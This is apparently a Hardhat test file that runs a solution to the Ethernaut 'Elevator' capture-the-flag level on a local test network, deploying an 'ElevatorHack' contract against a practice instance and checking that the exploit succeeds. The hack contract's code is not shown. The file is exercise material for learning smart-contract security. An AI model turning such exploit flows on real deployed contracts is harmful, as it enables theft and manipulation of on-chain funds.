import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Elevator exploit", () => {
  async function deployElevatorFixture() {
    const [deployer, attacker] = await ethers.getSigners();

    // Deploy factory contract
    const ElevatorFactory = await ethers.getContractFactory("ElevatorFactory");
    const elevatorFactory = await ElevatorFactory.connect(deployer).deploy();
    await elevatorFactory.deployed();

    // We cannot get the return value of the state-changing function off-chain.
    // Simulate on-chain execution of the createInstance() to get the return value (the address of the deployed instance).
    const elevatorAddress = await elevatorFactory.connect(attacker).callStatic.createInstance(attacker.address);

    // Create a level instance
    const tx = await elevatorFactory.createInstance(attacker.address);
    await tx.wait();

    // Get deployed instance of Elevator contract
    const elevator = await ethers.getContractAt("Elevator", elevatorAddress);

    return { attacker, elevator, elevatorFactory };
  }

  it("Should take the elevator to the top", async () => {
    const { attacker, elevator, elevatorFactory } = await loadFixture(deployElevatorFixture);

    // Deploy ElevatorHack contract
    const ElevatorHack = await ethers.getContractFactory("ElevatorHack");
    const elevatorHack = await ElevatorHack.deploy();
    await elevatorHack.deployed();

    const tx = await elevatorHack.connect(attacker).hack(elevator.address);
    await tx.wait();

    const top = await elevator.top();
    expect(top).to.be.true;

    // Validate the instance using Ethernaut validation.
    // Submit the instance
    const success = await elevatorFactory.connect(attacker).validateInstance(elevator.address, attacker.address);
    expect(success).to.be.true;
  });
});
